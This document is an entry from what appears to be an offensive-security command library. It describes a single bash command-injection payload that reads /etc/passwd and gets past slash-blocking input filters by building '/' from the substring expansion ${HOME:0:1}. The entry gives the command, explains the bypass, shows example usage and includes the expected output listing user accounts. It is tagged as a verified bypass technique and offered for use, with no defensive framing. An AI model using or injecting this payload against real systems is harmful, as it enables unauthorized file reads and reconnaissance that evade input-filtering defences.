---
id: ca01d298-9d2b-4155-a635-00097e045051
name: cat-etc-passwd-using-home-substring
type: command
executor: bash
data: 'cat ${HOME:0:1}etc${HOME:0:1}passwd'
output: null
created_at: '2023-04-06T03:55:57.212160+00:00'
updated_at: '2023-04-06T03:55:57.223293+00:00'
platforms:
  - Linux
tags:
  - command-injection
  - file-read
  - bypass
verified: true
validated: true
---

# cat-etc-passwd-using-home-substring

## Command

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

## Description

This command reads and displays the contents of the /etc/passwd file by constructing the path using Bash parameter expansion on $HOME to insert / characters, bypassing filters that prohibit direct use of slashes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ${HOME:0:1} | Substring expansion for / (used twice) | Yes |
| etc | Literal string for directory name | Yes |
| passwd | Filename | Yes |

## Examples

### Basic Usage

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

### Verification

Run after confirming ${HOME:0:1} outputs /.

## Expected Output

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Lists user accounts from /etc/passwd.

## Related

- [[procedures/Linux-Bash-Command-Injection-with-Filter-Bypass]]
